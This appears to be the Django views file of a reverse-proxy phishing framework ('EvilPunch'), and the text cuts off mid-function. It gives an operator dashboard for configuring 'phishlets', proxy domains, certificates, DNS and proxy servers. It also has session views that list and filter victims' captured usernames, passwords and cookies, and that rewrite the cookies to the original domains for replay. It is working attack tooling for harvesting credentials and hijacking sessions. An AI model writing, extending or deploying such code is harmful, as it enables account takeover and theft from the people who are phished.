from django.contrib import messages
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required, user_passes_test
from django.shortcuts import redirect, render
from django.urls import reverse
from django import forms
from django.http import HttpRequest, HttpResponse, JsonResponse
from django.core.exceptions import ValidationError
import json
import uuid
from django.views.decorators.csrf import csrf_exempt
import base64
import hashlib

from django.db import models
from .models import Phishlet, Proxy, DNSSettings, ProxyDomain, DomainCertificate, Session, NotificationSettings, Redirectors
from . import dns_server as dns
from . import http_server as http


def login_view(request):
    if request.user.is_authenticated:
        return redirect('dashboard')

    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '')
        user = authenticate(request, username=username, password=password)
        if user is not None and (user.is_staff or user.is_superuser):
            login(request, user)
            next_url = request.GET.get('next') or reverse('dashboard')
            return redirect(next_url)
        messages.error(request, 'Invalid credentials or insufficient permissions.')

    return render(request, 'login.html')


def warning_view(request: HttpRequest) -> HttpResponse:
    """Public legal/ethical use disclaimer page"""
    return render(request, 'warning.html')


def help_view(request: HttpRequest) -> HttpResponse:
    """Public Help page with official links and resources"""
    return render(request, 'help.html')


def is_admin(user):
    return user.is_authenticated and (user.is_staff or user.is_superuser)


@login_required
@user_passes_test(is_admin)
def dashboard_view(request):
    # Get session statistics
    total_sessions = Session.objects.count()
    captured_sessions = Session.objects.filter(is_captured=True).count()
    sessions_with_credentials = Session.objects.filter(
        models.Q(captured_username__isnull=False) | 
        models.Q(captured_password__isnull=False)
    ).exclude(captured_username='').exclude(captured_password='').count()
    
    # Get recent captured sessions
    recent_captured_sessions = Session.objects.filter(
        is_captured=True
    ).select_related('phishlet').order_by('-created')[:5]
    

    total_phishlets = Phishlet.objects.count()
    total_domains = ProxyDomain.objects.count()
    total_redirectors = Redirectors.objects.count()
    total_proxies = Proxy.objects.count()
    
    context = {
        'total_sessions': total_sessions,
        'captured_sessions': captured_sessions,
        'sessions_with_credentials': sessions_with_credentials,
        'recent_captured_sessions': recent_captured_sessions,

        'total_phishlets': total_phishlets,
        'total_domains': total_domains,
        'total_redirectors': total_redirectors,
        'total_proxies': total_proxies,
    }
    
    return render(request, 'home.html', context)


def logout_view(request):
    logout(request)
    return redirect('login')


class PhishletForm(forms.ModelForm):
    class Meta:
        model = Phishlet
        fields = ["name", "is_active", "is_cache_enabled", "proxy_auth", "proxy", "redirector", "data"]

    def clean(self):
        cleaned = super().clean()
        data = cleaned.get("data")
        if not isinstance(data, dict):
            raise ValidationError("Data must be a JSON object.")
        # Ensure minimal keys if present
        if "hosts_to_proxy" in data and not isinstance(data.get("hosts_to_proxy"), list):
            raise ValidationError("'hosts_to_proxy' must be a list if provided.")
        # Ensure name inside data aligns (optional)
        if not data.get("name"):
            data["name"] = cleaned.get("name")
        return cleaned


class RedirectorForm(forms.ModelForm):
    class Meta:
        model = Redirectors
        fields = ["name", "data"]
        widgets = {
            "name": forms.TextInput(attrs={
                "class": "form-control",
                "placeholder": "Enter redirector name (e.g., google-login, facebook-auth)"
            }),
            "data": forms.Textarea(attrs={
                "class": "form-control",
                "rows": 15,
                "placeholder": "Enter HTML code for the redirector page..."
            })
        }

    def clean(self):
        cleaned = super().clean()
        name = cleaned.get("name")
        data = cleaned.get("data")
        
        if name and not name.replace("-", "").replace("_", "").isalnum():
            raise ValidationError("Name can only contain letters, numbers, hyphens, and underscores.")
        
        if data and len(data.strip()) < 10:
            raise ValidationError("HTML content must be at least 10 characters long.")
        
        return cleaned


@login_required
@user_passes_test(is_admin)
def phishlet_list_view(request: HttpRequest) -> HttpResponse:
    items = Phishlet.objects.all()
    return render(request, "phishlet_list.html", {"items": items})


@login_required
@user_passes_test(is_admin)
def phishlet_create_view(request: HttpRequest) -> HttpResponse:
    if request.method == "POST":
        form = PhishletForm(request.POST)
        if form.is_valid():
            form.save()
            messages.success(request, "Phishlet created.")
            return redirect("phishlet_list")
    else:
        form = PhishletForm()
    return render(request, "phishlet_form.html", {"form": form})


@login_required
@user_passes_test(is_admin)
def phishlet_edit_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
    instance = Phishlet.objects.get(pk=pk)
    if request.method == "POST":
        form = PhishletForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            messages.success(request, "Phishlet updated.")
            return redirect("phishlet_list")
    else:
        form = PhishletForm(instance=instance)
    return render(request, "phishlet_form.html", {"form": form, "instance": instance})


@login_required
@user_passes_test(is_admin)
def phishlet_download_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
    instance = Phishlet.objects.get(pk=pk)
    content = json.dumps(instance.data, ensure_ascii=False, indent=2)
    response = HttpResponse(content, content_type="application/json; charset=utf-8")
    response["Content-Disposition"] = f'attachment; filename="{instance.name}.json"'
    return response


@login_required
@user_passes_test(is_admin)
def phishlet_toggle_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
    if request.method != "POST":
        return JsonResponse({"error": "POST required"}, status=405)
    instance = Phishlet.objects.get(pk=pk)
    instance.is_active = not instance.is_active
    instance.save(update_fields=["is_active", "updated_at"])
    return JsonResponse({"ok": True, "is_active": instance.is_active})

@login_required
@user_passes_test(is_admin)
def phishlet_delete_view(request, pk):
    if request.method == "POST":
        try:
            obj = Phishlet.objects.get(pk=pk)
            obj.delete()
            return JsonResponse({"ok": True, "message": "Phishlet deleted successfully."})
        except Phishlet.DoesNotExist:
            return JsonResponse({"ok": False, "message": "Phishlet not found."}, status=404)
        except Exception as e:
            return JsonResponse({"ok": False, "message": str(e)}, status=500)

    return JsonResponse({"ok": False, "message": "Method not allowed."}, status=405)


@login_required

@login_required
@user_passes_test(is_admin)
def domain_delete_view(request, pk):
    if request.method == "POST":
        try:
            obj = ProxyDomain.objects.get(pk=pk)
            obj.delete()
            return JsonResponse({"ok": True, "message": "Domain deleted successfully."})
        except ProxyDomain.DoesNotExist:
            return JsonResponse({"ok": False, "message": "Domain not found."}, status=404)
        except Exception as e:
            return JsonResponse({"ok": False, "message": str(e)}, status=500)

    return JsonResponse({"ok": False, "message": "Method not allowed."}, status=405)


@login_required
@user_passes_test(is_admin)
def phishlet_toggle_cache_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
    if request.method != "POST":
        return JsonResponse({"error": "POST required"}, status=405)
    instance = Phishlet.objects.get(pk=pk)
    instance.is_cache_enabled = not instance.is_cache_enabled
    instance.save(update_fields=["is_cache_enabled", "updated_at"])
    return JsonResponse({"ok": True, "is_cache_enabled": instance.is_cache_enabled})


@login_required
@user_passes_test(is_admin)
def phishlet_clear_cache_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
    if request.method != "POST":
        return JsonResponse({"error": "POST required"}, status=405)
    
    try:
        instance = Phishlet.objects.get(pk=pk)
        phishlet_name = instance.name
        
        # Import here to avoid circular imports
        from . import http_server
        
        # Clear cache for this specific phishlet
        cleared_count = 0
        total_size_cleared = 0
        
        import os
        from pathlib import Path
        
        cache_folder = getattr(http_server, 'CACHE_FOLDER', 'cache_folder')
        phishlet_cache_dir = Path(cache_folder) / phishlet_name
        
        if phishlet_cache_dir.exists() and phishlet_cache_dir.is_dir():
            for cache_file in phishlet_cache_dir.iterdir():
                if cache_file.is_file():
                    try:
                        if cache_file.suffix == '.meta':
                            # Get file size before deletion for stats
                            try:
                                import json
                                with open(cache_file, 'r', encoding='utf-8') as f:
                                    metadata = json.load(f)
                                    total_size_cleared += metadata.get('file_size', 0)
                            except:
                                pass
                        
                        cache_file.unlink()
                        cleared_count += 1
                    except Exception as e:
                        # Log error but continue with other files
                        print(f"Error removing cache file {cache_file}: {e}")
        
        # Update cache statistics if available
        try:
            cache_stats = getattr(http_server, '_cache_stats', {})
            if 'total_size_bytes' in cache_stats:
                cache_stats['total_size_bytes'] = max(0, cache_stats['total_size_bytes'] - total_size_cleared)
        except:
            pass
        
        return JsonResponse({
            "ok": True, 
            "message": f"Cache cleared for {phishlet_name}: {cleared_count} files, {total_size_cleared / (1024*1024):.2f}MB freed",
            "cleared_files": cleared_count,
            "size_freed_mb": round(total_size_cleared / (1024*1024), 2),
            "phishlet_name": phishlet_name
        })
        
    except Phishlet.DoesNotExist:
        return JsonResponse({"error": "Phishlet not found"}, status=404)
    except Exception as e:
        return JsonResponse({"error": f"Failed to clear cache: {str(e)}"}, status=500)


@login_required
@user_passes_test(is_admin)
def phishlet_get_local_hosts_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
    if request.method != "GET":
        return JsonResponse({"error": "GET required"}, status=405)
    
    try:
        phishlet = Phishlet.objects.get(pk=pk)
        data = phishlet.data
        
        if not isinstance(data, dict):
            return JsonResponse({"ok": False, "error": "Invalid phishlet data format"}, status=400)
        
        proxy_domain = data.get("proxy_domain")
        if not proxy_domain:
            return JsonResponse({"ok": False, "error": "No proxy domain configured for this phishlet"}, status=400)
        
        hosts_to_proxy = data.get("hosts_to_proxy", [])
        if not isinstance(hosts_to_proxy, list):
            return JsonResponse({"ok": False, "error": "Invalid hosts_to_proxy format"}, status=400)
        
        # Generate hosts list
        hosts_list = []
        for host in hosts_to_proxy:
            if isinstance(host, dict) and "proxy_subdomain" in host:
                if host["proxy_subdomain"]:
                    hosts_list.append(f"127.0.0.1 {host['proxy_subdomain']}.{proxy_domain}")
                else:
                    hosts_list.append(f"127.0.0.1 {proxy_domain}")
            else:
                # Fallback: if no proxy_subdomain, use the main domain
                hosts_list.append(f"127.0.0.1 {proxy_domain}")
        
        # If no hosts_to_proxy or all entries are invalid, at least provide the main domain
        if not hosts_list:
            hosts_list.append(f"127.0.0.1 {proxy_domain}")
        
        # Join with newlines
        hosts_text = "\n".join(hosts_list)
        
        return JsonResponse({
            "ok": True,
            "hosts_list": hosts_text,
            "proxy_domain": proxy_domain,
            "hosts_count": len(hosts_list)
        })
        
    except Phishlet.DoesNotExist:
        return JsonResponse({"ok": False, "error": "Phishlet not found"}, status=404)
    except Exception as e:
        return JsonResponse({"ok": False, "error": str(e)}, status=500)


class ProxyDomainForm(forms.ModelForm):
    class Meta:
        model = ProxyDomain
        fields = ["hostname"]


class DomainCertForm(forms.ModelForm):
    class Meta:
        model = DomainCertificate
        fields = ["cert_pem", "key_pem"]


@login_required
@user_passes_test(is_admin)
def proxy_domains_view(request: HttpRequest) -> HttpResponse:
    items = ProxyDomain.objects.all().select_related("certificate")
    add_form = ProxyDomainForm()
    cert_form = DomainCertForm()
    return render(request, 'proxy_domains.html', {"items": items, "add_form": add_form, "cert_form": cert_form})


@login_required
@user_passes_test(is_admin)
def proxy_domain_add_view(request: HttpRequest) -> HttpResponse:
    if request.method != "POST":
        return redirect("proxy_domains")
    form = ProxyDomainForm(request.POST)
    if form.is_valid():
        form.save()
        messages.success(request, "Domain added.")
    else:
        messages.error(request, "; ".join([f"{k}: {','.join(v)}" for k, v in form.errors.items()]))
    return redirect("proxy_domains")


@login_required
@user_passes_test(is_admin)
def proxy_domain_toggle_view(request: HttpRequest, pk: uuid.UUID) -> JsonResponse:
    if request.method != "POST":
        return JsonResponse({"error": "POST required"}, status=405)
    domain = ProxyDomain.objects.get(pk=pk)
    target_state = not domain.is_active
    if target_state:
        cert = getattr(domain, "certificate", None)
        if not cert or not cert.cert_pem.strip() or not cert.key_pem.strip():
            return JsonResponse({"ok": False, "error": "Certificate (cert and key) is required before activation."}, status=400)
    domain.is_active = target_state
    domain.save(update_fields=["is_active", "updated_at"])
    return JsonResponse({"ok": True, "is_active": domain.is_active})


@login_required
@user_passes_test(is_admin)
def proxy_domain_cert_add_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
    domain = ProxyDomain.objects.get(pk=pk)
    if request.method == "GET":
        # Return existing certificate data for form population
        cert = getattr(domain, "certificate", None)
        if cert:
            return JsonResponse({
                "cert_pem": cert.cert_pem,
                "key_pem": cert.key_pem,
                "exists": True
            })
        else:
            return JsonResponse({
                "cert_pem": "",
                "key_pem": "",
                "exists": False
            })
    
    # Handle POST request for adding/updating certificate
    if request.method != "POST":
        return redirect("proxy_domains")
    
    # Allow replacing existing cert
    instance = getattr(domain, "certificate", None)
    form = DomainCertForm(request.POST, instance=instance)
    if form.is_valid():
        cert = form.save(commit=False)
        cert.domain = domain
        cert.save()
        messages.success(request, f"Certificate saved for {domain.hostname}.")
    else:
        messages.error(request, "; ".join([f"{k}: {','.join(v)}" for k, v in form.errors.items()]))
    return redirect("proxy_domains")


@login_required
@user_passes_test(is_admin)
def proxy_domain_cert_get_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
    domain = ProxyDomain.objects.get(pk=pk)
    cert = getattr(domain, "certificate", None)
    if not cert:
        messages.error(request, "No certificate found for this domain.")
        return redirect("proxy_domains")
    payload = {
        "hostname": domain.hostname,
        "cert_pem": cert.cert_pem,
        "key_pem": cert.key_pem,
    }
    content = json.dumps(payload, ensure_ascii=False, indent=2)
    response = HttpResponse(content, content_type="application/json; charset=utf-8")
    response["Content-Disposition"] = f'attachment; filename="{domain.hostname}.cert.json"'
    return response


@login_required
@user_passes_test(is_admin)
def proxy_domain_generate_ssl_view(request: HttpRequest, pk: uuid.UUID):
    """Generate a self-signed SSL certificate for a proxy domain"""
    if request.method != "POST":
        return JsonResponse({"success": False, "error": "Method not allowed"})
    
    try:
        domain = ProxyDomain.objects.get(pk=pk)
        
        # Validate domain hostname
        if not domain.hostname or len(domain.hostname.strip()) == 0:
            return JsonResponse({"success": False, "error": "Invalid domain hostname"})
        
        # Get form data with validation
        country = request.POST.get('country', 'US')
        state = request.POST.get('state', 'California')
        city = request.POST.get('city', 'San Francisco')
        organization = request.POST.get('organization', 'EvilPunch')
        common_name = request.POST.get('common_name', domain.hostname)
        validity_days = int(request.POST.get('validity_days', 365))
        key_size = int(request.POST.get('key_size', 2048))
        
        # Validate inputs
        if validity_days < 1 or validity_days > 3650:
            return JsonResponse({"success": False, "error": "Validity must be between 1 and 3650 days"})
        
        if key_size not in [2048, 4096]:
            return JsonResponse({"success": False, "error": "Key size must be 2048 or 4096 bits"})
        
        # Import datetime at the beginning to avoid scope issues
        from datetime import datetime, timedelta
        
        # Try Python OpenSSL first
        cert_pem = None
        key_pem = None
        
        try:
            from OpenSSL import crypto
            import OpenSSL
            openssl_version = OpenSSL.__version__
            
            # Generate private key
            key = crypto.PKey()
            key.generate_key(crypto.TYPE_RSA, key_size)
            
            # Create certificate with minimal structure to avoid ASN.1 issues
            cert = crypto.X509()
            
            # Set subject (minimal fields)
            subject = cert.get_subject()
            subject.CN = str(domain.hostname).strip() if domain.hostname else "localhost"
            # Only set country if it's a valid 2-letter code
            if country and len(country.strip()) == 2:
                subject.C = country.strip()
            
            # Set issuer to self (self-signed)
            cert.set_issuer(subject)
            
            # Set validity period
            not_before = datetime.now() - timedelta(days=1)
            not_after = datetime.now() + timedelta(days=validity_days)
            
            cert.set_notBefore(not_before.strftime("%Y%m%d%H%M%SZ").encode('ascii'))
            cert.set_notAfter(not_after.strftime("%Y%m%d%H%M%SZ").encode('ascii'))
            
            # Set serial number
            cert.set_serial_number(1)
            
            # Try to add minimal extensions without causing ASN.1 issues
            try:
                # Only add the most essential extension
                cert.add_extensions([
                    crypto.X509Extension(b"basicConstraints", False, b"CA:FALSE")
                ])
            except Exception as ext_error:
                # If extensions fail, continue without them
                print(f"Warning: Could not add extensions: {ext_error}")
            
            # Sign certificate with SHA1 (more compatible)
            try:
                cert.sign(key, 'sha1')
            except Exception as sha1_error:
                # Try SHA256 if SHA1 fails
                try:
                    cert.sign(key, 'sha256')
                except Exception as sha256_error:
                    raise Exception(f"Certificate signing failed with both SHA1 and SHA256: {sha1_error}, {sha256_error}")
            
            # Convert to PEM format
            cert_pem = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
            key_pem = crypto.dump_privatekey(crypto.FILETYPE_PEM, key)
            
        except Exception as python_ssl_error:
            # Log the Python OpenSSL error for debugging
            print(f"Python OpenSSL failed: {python_ssl_error}")
            
            # If Python OpenSSL fails, try system OpenSSL
            try:
                import subprocess
                import tempfile
                import os
                
                # Generate private key using system OpenSSL
                key_path = None
                cert_path = None
                
                try:
                    # Create temporary key file
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.key', delete=False) as key_file:
                        key_path = key_file.name
                    
                    # Create temporary config file
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as conf_file:
                        conf_content = f"""[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
C = {country}
ST = {state}
L = {city}
O = {organization}
CN = {domain.hostname}

[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = {domain.hostname}
DNS.2 = *.{domain.hostname}
"""
                        conf_file.write(conf_content)
                        conf_path = conf_file.name
                    
                    # Generate private key
                    key_cmd = ['openssl', 'genrsa', '-out', key_path, str(key_size)]
                    key_result = subprocess.run(key_cmd, capture_output=True, text=True, timeout=30)
                    
                    if key_result.returncode != 0:
                        raise Exception(f"Failed to generate private key: {key_result.stderr}")
                    
                    # Generate certificate
                    cert_cmd = [
                        'openssl', 'req', '-new', '-x509', '-key', key_path,
                        '-out', '/tmp/temp_cert.pem', '-days', str(validity_days),
                        '-config', conf_path, '-sha256'
                    ]
                    
                    cert_result = subprocess.run(cert_cmd, capture_output=True, text=True, timeout=30)
                    
                    if cert_result.returncode == 0:
                        # Read the generated certificate and key
                        with open('/tmp/temp_cert.pem', 'r') as f:
                            cert_pem = f.read().encode('utf-8')
                        
                        with open(key_path, 'r') as f:
                            key_pem = f.read().encode('utf-8')
                        
                        # Clean up temp files
                        os.unlink('/tmp/temp_cert.pem')
                    else:
                        raise Exception(f"Failed to generate certificate: {cert_result.stderr}")
                        
                finally:
                    # Clean up temporary files
                    if key_path and os.path.exists(key_path):
                        os.unlink(key_path)
                    if conf_path and os.path.exists(conf_path):
                        os.unlink(conf_path)
                
                openssl_version = "System OpenSSL"
                
            except Exception as system_ssl_error:
                return JsonResponse({
                    "success": False, 
                    "error": f"All certificate generation methods failed. Python OpenSSL error: {str(python_ssl_error)}. System OpenSSL error: {str(system_ssl_error)}"
                })
        
        # Verify we have both certificate and key
        if not cert_pem or not key_pem:
            return JsonResponse({"success": False, "error": "Failed to generate certificate or private key"})
        
        # Save to database
        try:
            cert_instance = getattr(domain, "certificate", None)
            if cert_instance:
                # Update existing certificate
                cert_instance.cert_pem = cert_pem.decode('utf-8')
                cert_instance.key_pem = key_pem.decode('utf-8')
                cert_instance.save()
            else:
                # Create new certificate
                from .models import DomainCertificate
                cert_instance = DomainCertificate.objects.create(
                    domain=domain,
                    cert_pem=cert_pem.decode('utf-8'),
                    key_pem=key_pem.decode('utf-8')
                )
        except Exception as db_error:
            return JsonResponse({"success": False, "error": f"Error saving certificate to database: {str(db_error)}"})
        
        return JsonResponse({
            "success": True,
            "message": f"Self-signed SSL certificate generated successfully for {domain.hostname}",
            "validity_days": validity_days,
            "key_size": key_size,
            "openssl_version": openssl_version
        })
        
    except ProxyDomain.DoesNotExist:
        return JsonResponse({"success": False, "error": "Domain not found"})
    except Exception as e:
        return JsonResponse({"success": False, "error": f"Error generating certificate: {str(e)}"})


@login_required
@user_passes_test(is_admin)
def proxy_server_view(request: HttpRequest) -> HttpResponse:
    return render(request, 'proxy_server.html')


@login_required
@user_passes_test(is_admin)
def dns_server_view(request: HttpRequest) -> HttpResponse:
    # GET renders page; POST updates settings (dns_port) inline
    settings = DNSSettings.objects.first() or DNSSettings.objects.create()
    if request.method == 'POST':
        try:
            payload = json.loads(request.body.decode('utf-8') or '{}')
        except json.JSONDecodeError:
            payload = {}
        new_port = payload.get('dns_port')
        if new_port:
            settings.dns_port = int(new_port)
            settings.full_clean()
            settings.save(update_fields=['dns_port'])
        return JsonResponse({"ok": True, "dns_port": settings.dns_port})
    status = dns.get_status()
    return render(request, 'dns_server.html', {"status": status, "settings": settings})


@login_required
@user_passes_test(is_admin)
def servers_view(request: HttpRequest) -> HttpResponse:
    # GET renders page; POST updates settings (dns_port) inline
    settings = DNSSettings.objects.first() or DNSSettings.objects.create()
    if request.method == 'POST':
        try:
            payload = json.loads(request.body.decode('utf-8') or '{}')
        except json.JSONDecodeError:
            payload = {}
        new_port = payload.get('dns_port')
        if new_port:
            settings.dns_port = int(new_port)
            settings.full_clean()
            settings.save(update_fields=['dns_port'])
        return JsonResponse({"ok": True, "dns_port": settings.dns_port})
    status = dns.get_status()
    return render(request, 'servers.html', {"status": status, "settings": settings})


@login_required
@user_passes_test(is_admin)
def error_logs_view(request: HttpRequest) -> HttpResponse:
    return render(request, 'error_logs.html')


# --- DNS Server control endpoints ---
@login_required
@user_passes_test(is_admin)
def dns_start_view(request: HttpRequest) -> JsonResponse:
    settings = DNSSettings.objects.first() or DNSSettings.objects.create()
    result = dns.start_dns_server(port=int(settings.dns_port))
    
    # Send notification about DNS server start
    try:
        from .notify import notify_server_status_change
        if result.get('success'):
            notify_server_status_change("dns", "running")
    except Exception as e:
        # Log notification error but don't fail the main operation
        import logging
        logger = logging.getLogger(__name__)
        logger.warning(f"Failed to send DNS start notification: {e}")
    
    return JsonResponse(result)


@login_required
@user_passes_test(is_admin)
def dns_stop_view(request: HttpRequest) -> JsonResponse:
    result = dns.stop_dns_server()
    
    # Send notification about DNS server stop
    try:
        from .notify import notify_server_status_change
        if result.get('success'):
            notify_server_status_change("dns", "stopped")
    except Exception as e:
        # Log notification error but don't fail the main operation
        import logging
        logger = logging.getLogger(__name__)
        logger.warning(f"Failed to send DNS stop notification: {e}")
    
    return JsonResponse(result)


@login_required
@user_passes_test(is_admin)
def dns_restart_view(request: HttpRequest) -> JsonResponse:
    settings = DNSSettings.objects.first() or DNSSettings.objects.create()
    result = dns.restart_dns_server(port=int(settings.dns_port))
    return JsonResponse(result)


@login_required
@user_passes_test(is_admin)
def dns_status_view(request: HttpRequest) -> JsonResponse:
    return JsonResponse(dns.get_status())


# --- Proxy Server control endpoints ---
@login_required
@user_passes_test(is_admin)
def proxy_start_view(request: HttpRequest) -> JsonResponse:
    try:
        payload = json.loads(request.body.decode('utf-8') or '{}') if request.body else {}
    except json.JSONDecodeError:
        payload = {}
    port = payload.get('port')
    # Target/Proxy hosts are decided by the active phishlet; do not accept from UI
    result = http.start_proxy_server(
        port=int(port) if port else None,
    )
    
    # Send notification about proxy server start
    try:
        from .notify import notify_server_status_change
        if result.get('success'):
            notify_server_status_change("proxy", "running")
    except Exception as e:
        # Log notification error but don't fail the main operation
        import logging
        logger = logging.getLogger(__name__)
        logger.warning(f"Failed to send proxy start notification: {e}")
    
    return JsonResponse(result)


@login_required
@user_passes_test(is_admin)
def proxy_stop_view(request: HttpRequest) -> JsonResponse:
    result = http.stop_proxy_server()
    
    # Send notification about proxy server stop
    try:
        from .notify import notify_server_status_change
        if result.get('success'):
            notify_server_status_change("proxy", "stopped")
    except Exception as e:
        # Log notification error but don't fail the main operation
        import logging
        logger = logging.getLogger(__name__)
        logger.warning(f"Failed to send proxy stop notification: {e}")
    
    return JsonResponse(result)


@login_required
@user_passes_test(is_admin)
def proxy_restart_view(request: HttpRequest) -> JsonResponse:
    try:
        payload = json.loads(request.body.decode('utf-8') or '{}') if request.body else {}
    except json.JSONDecodeError:
        payload = {}
    port = payload.get('port')
    if port:
        result = http.restart_proxy_server(port=int(port))
    else:
        result = http.restart_proxy_server()
    return JsonResponse(result)


@login_required
@user_passes_test(is_admin)
def proxy_status_view(request: HttpRequest) -> JsonResponse:
    try:
        status = http.get_proxy_status()
        return JsonResponse(status)
    except Exception as e:
        return JsonResponse({"error": str(e)}, status=500)


@login_required
@user_passes_test(is_admin)
def sessions_view(request: HttpRequest) -> HttpResponse:
    """Display all captured sessions with filtering options"""
    # By default, only show captured sessions
    total = Session.objects.all().count()
    sessions = Session.objects.filter(is_captured=True).select_related('phishlet').order_by('-created')
    
    # Filter by phishlet
    phishlet_filter = request.GET.get('phishlet')
    if phishlet_filter:
        sessions = sessions.filter(phishlet__name=phishlet_filter)
    
    # Filter by proxy domain
    domain_filter = request.GET.get('domain')
    if domain_filter:
        sessions = sessions.filter(proxy_domain__icontains=domain_filter)
    
    # Filter by IP address
    ip_filter = request.GET.get('ip')
    if ip_filter:
        sessions = sessions.filter(visitor_ip__icontains=ip_filter)
    
    # Filter by credentials (has username/password)
    has_creds = request.GET.get('has_credentials')
    if has_creds == 'true':
        sessions = sessions.filter(
            models.Q(captured_username__isnull=False) | 
            models.Q(captured_password__isnull=False)
        ).exclude(captured_username='').exclude(captured_password='')
    elif has_creds == 'false':
        sessions = sessions.filter(
            models.Q(captured_username__isnull=True) | 
            models.Q(captured_username=''),
            models.Q(captured_password__isnull=True) | 
            models.Q(captured_password='')
        )
    
    # Filter by active status
    active_filter = request.GET.get('active')
    if active_filter == 'true':
        sessions = sessions.filter(is_active=True)
    elif active_filter == 'false':
        sessions = sessions.filter(is_active=False)
    
    # Filter by captured status (show all, captured only, or uncaptured only)
    captured_filter = request.GET.get('captured')
    if captured_filter == 'all':
        sessions = Session.objects.all().select_related('phishlet').order_by('-created')
        # Reapply other filters
        if phishlet_filter:
            sessions = sessions.filter(phishlet__name=phishlet_filter)
        if domain_filter:
            sessions = sessions.filter(proxy_domain__icontains=domain_filter)
        if ip_filter:
            sessions = sessions.filter(visitor_ip__icontains=ip_filter)
        if has_creds == 'true':
            sessions = sessions.filter(
                models.Q(captured_username__isnull=False) | 
                models.Q(captured_password__isnull=False)
            ).exclude(captured_username='').exclude(captured_password='')
        elif has_creds == 'false':
            sessions = sessions.filter(
                models.Q(captured_username__isnull=True) | 
                models.Q(captured_username='')
            )
        if active_filter == 'true':
            sessions = sessions.filter(is_active=True)
        elif active_filter == 'false':
            sessions = sessions.filter(is_active=False)
    elif captured_filter == 'uncaptured':
        sessions = Session.objects.filter(is_captured=False).select_related('phishlet').order_by('-created')
        # Reapply other filters
        if phishlet_filter:
            sessions = sessions.filter(phishlet__name=phishlet_filter)
        if domain_filter:
            sessions = sessions.filter(proxy_domain__icontains=domain_filter)
        if ip_filter:
            sessions = sessions.filter(visitor_ip__icontains=ip_filter)
        if has_creds == 'true':
            sessions = sessions.filter(
                models.Q(captured_username__isnull=False) | 
                models.Q(captured_password__isnull=False)
            ).exclude(captured_username='').exclude(captured_password='')
        elif has_creds == 'false':
            sessions = sessions.filter(
                models.Q(captured_username__isnull=True) | 
                models.Q(captured_username='')
            )
        if active_filter == 'true':
            sessions = sessions.filter(is_active=True)
        elif active_filter == 'false':
            sessions = sessions.filter(is_active=False)
    
    # Get available filter options
    available_phishlets = Phishlet.objects.filter(is_active=True).values_list('name', flat=True)
    available_domains = Session.objects.values_list('proxy_domain', flat=True).distinct()
    
    context = {
        'sessions': sessions,
        "total": total,
        'total_sessions': sessions.count(),
        'sessions_with_credentials': sessions.filter(
            models.Q(captured_username__isnull=False) | 
            models.Q(captured_password__isnull=False)
        ).exclude(captured_username='').exclude(captured_password='').count(),
        'available_phishlets': available_phishlets,
        'available_domains': available_domains,
        'filters': {
            'phishlet': phishlet_filter,
            'domain': domain_filter,
            'ip': ip_filter,
            'has_credentials': has_creds,
            'active': active_filter,
            'captured': captured_filter or 'captured',  # Default to captured
        }
    }
    
    return render(request, "sessions.html", context)


@login_required
@user_passes_test(is_admin)
def toggle_session_status_view(request: HttpRequest, session_id: int) -> JsonResponse:
    """Toggle session active status"""
    try:
        session = Session.objects.get(id=session_id)
        old_status = session.is_active
        session.is_active = not session.is_active
        session.save()
        
        # Send notification about status change
        try:
            from .notify import send_notification
            status_text = "activated" if session.is_active else "deactivated"
            message = f"Session {status_text} for phishlet: {session.phishlet.name if session.phishlet else 'Unknown'}"
            send_notification(message, "session_status")
        except Exception as e:
            # Log notification error but don't fail the main operation
            import logging
            logger = logging.getLogger(__name__)
            logger.warning(f"Failed to send session status notification: {e}")
        
        return JsonResponse({
            'success': True,
            'session_id': session_id,
            'is_active': session.is_active,
            'message': f"Session {'activated' if session.is_active else 'deactivated'} successfully"
        })
    except Session.DoesNotExist:
        return JsonResponse({
            'success': False,
            'error': 'Session not found'
        }, status=404)
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': str(e)
        }, status=500)


@login_required
@user_passes_test(is_admin)
def get_session_details_view(request: HttpRequest, session_id: int) -> JsonResponse:
    """Get detailed session information for modal display"""
    try:
        session = Session.objects.select_related('phishlet').get(id=session_id)
        
        # Transform cookies for display (original domains)
        try:
            from .notify import notification_manager
            transformed_cookies = notification_manager.transform_cookies_for_phishlet(
                session.captured_cookies or {},
                session.phishlet.data if session.phishlet and isinstance(session.phishlet.data, dict) else {},
                session.proxy_domain or ''
            )
        except Exception:
            transformed_cookies = session.captured_cookies

        return JsonResponse({
            'success': True,
            'session': {
                'id': session.id,
                'session_cookie': session.session_cookie,
                'phishlet_name': session.phishlet.name,
                'proxy_domain': session.proxy_domain,
                'visitor_ip': session.visitor_ip,
                'user_agent': session.user_agent,
                'captured_username': session.captured_username,
                'captured_password': session.captured_password,
                'captured_cookies': transformed_cookies,
                'captured_custom': session.captured_custom,
                'is_active': session.is_active,
                'is_captured': session.is_captured,
                'telegram_message_id': session.telegram_message_id,
                'has_notification': session.telegram_message_id is not None,
                'created': session.created.isoformat(),
                'updated': session.updated.isoformat(),
            }
        })
    except Session.DoesNotExist:
        return JsonResponse({
            'success': False,
            'error': 'Session not found'
        }, status=404)
    except Exception as e:
        return JsonResponse({
            'success': False,
            'error': str(e)
        }, status=500)


@login_required
@user_passes_test(is_admin)
def delete_session_view(request: HttpRequest, session_id: int) -> JsonResponse:
    """Delete a session"""
    try:
        session = Session.objects.get(id=session_id)
        session.delete()
        
        return JsonResponse({
            'success': True,
            'message': f"Session deleted successfully"
        })
    except Session.DoesNotExist:
        return JsonResponse({
            'success': False,
